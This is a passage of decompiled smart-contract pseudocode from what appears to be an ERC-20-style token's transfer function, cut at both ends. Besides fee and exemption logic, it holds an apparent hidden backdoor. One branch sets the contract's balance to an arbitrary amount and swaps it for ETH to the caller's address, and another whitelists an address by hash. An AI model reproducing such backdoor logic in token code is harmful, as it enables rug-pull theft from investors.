                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7244 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7244 + 32 len mem[_7244]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7168 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7186 = mem[_7168]
                        require mem[_7168] == mem[_7168 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7234 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7267 = mem[_7234]
                        require mem[_7234] == mem[_7234 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7267)
                        require ext_code.size(address(_7186))
                        staticcall address(_7186).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7267)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7435 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7507 = mem[_7435]
                        require mem[_7435] == mem[_7435 + 12 len 20]
                        if mem[_7435 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7877 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7877 + 32 len mem[_7877]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7507):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7907 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7907 + 32 len mem[_7907]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
        else:
            if arg1 == msg.sender:
                if not this.address:
                    revert with 0, 'IERC20: approve from the zero address'
                if not address(stor20.field_8):
                    revert with 0, 'IERC20: approve to the zero address'
                allowance[address(this.address)][address(stor20.field_0)] = arg2
                emit Approval(arg2, this.address, address(stor20.field_8));
                balanceOf[address(this.address)] = arg2
                mem[180] = this.address
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[244] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[212] = ext_call.return_data[12 len 20]
                stor18 = 1
                if block.timestamp > -21:
                    revert with 'NH{q', 17
                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                mem[ceil32(return_data.size) + 248] = arg2
                idx = 0
                s = 180
                t = ceil32(return_data.size) + 440
                while idx < 2:
                    mem[t] = mem[s + 12 len 20]
                    idx = idx + 1
                    s = s + 32
                    t = t + 32
                    continue 
                require ext_code.size(address(stor20.field_8))
                call address(stor20.field_8).swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                     gas gas_remaining wei
                    args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                stor18 = 0
            else:
                if stor18:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor16[address(msg.sender)]:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if arg1 == this.address:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
